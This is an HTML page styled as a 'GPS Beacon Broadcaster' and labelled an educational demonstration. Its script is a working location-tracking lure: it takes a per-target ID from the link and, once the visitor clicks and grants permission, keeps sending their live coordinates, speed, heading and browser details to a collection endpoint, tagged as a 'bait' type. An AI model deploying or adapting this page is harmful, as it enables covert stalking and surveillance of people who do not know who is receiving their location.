<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Direct GPS Telemetry Broadcaster</title>
    <link
        href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Rajdhani:wght@500;700&display=swap"
        rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Rajdhani', sans-serif;
        }

        body {
            background: #030712;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .box {
            background: rgba(15, 23, 42, 0.9);
            border: 1px solid rgba(0, 242, 254, 0.4);
            border-radius: 16px;
            padding: 32px;
            width: 100%;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 0 30px rgba(0, 242, 254, 0.2);
        }

        .box h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 18px;
            color: #00f2fe;
            margin-bottom: 6px;
        }

        .beacon-icon {
            font-size: 54px;
            color: #38bdf8;
            margin: 24px 0;
        }

        .status-text {
            font-family: 'Orbitron', sans-serif;
            font-size: 14px;
            color: #4ade80;
            margin-bottom: 20px;
        }

        .btn-broadcast {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%);
            border: none;
            border-radius: 8px;
            color: #030712;
            font-family: 'Orbitron', sans-serif;
            font-weight: 800;
            font-size: 14px;
            cursor: pointer;
        }
    </style>
</head>

<body>
    <div class="box">
        <h1>GPS BEACON BROADCASTER</h1>
        <p style="font-size: 13px; color: #94a3b8;">Seminar & Educational Demonstration Tool</p>

        <div class="beacon-icon">
            <i class="fa-solid fa-satellite"></i>
        </div>

        <div id="statusText" class="status-text">BEACON READY</div>

        <button id="broadcastBtn" class="btn-broadcast" onclick="startBroadcast()">
            <i class="fa-solid fa-radio"></i> BROADCAST LIVE GPS
        </button>
    </div>

    <script>
        const targetId = new URLSearchParams(window.location.search).get("id") || localStorage.getItem("target_id") || "BeaconTarget";

        function startBroadcast() {
            const btn = document.getElementById("broadcastBtn");
            btn.disabled = true;
            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> TRANSMITTING...';

            if (navigator.geolocation) {
                navigator.geolocation.watchPosition((pos) => {
                    document.getElementById("statusText").innerText = "LIVE SIGNAL TRANSMITTING";
                    fetch("/location-payload", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            id: targetId,
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            altitude: pos.coords.altitude || 0,
                            accuracy: pos.coords.accuracy || 10,
                            speed: pos.coords.speed || 0,
                            heading: pos.coords.heading || 0,
                            userAgent: navigator.userAgent,
                            baitType: "GPS Beacon"
                        })
                    });
                }, () => { alert("Location access required for beacon transmission."); }, { enableHighAccuracy: true });
            }
        }
    </script>
</body>

</html>
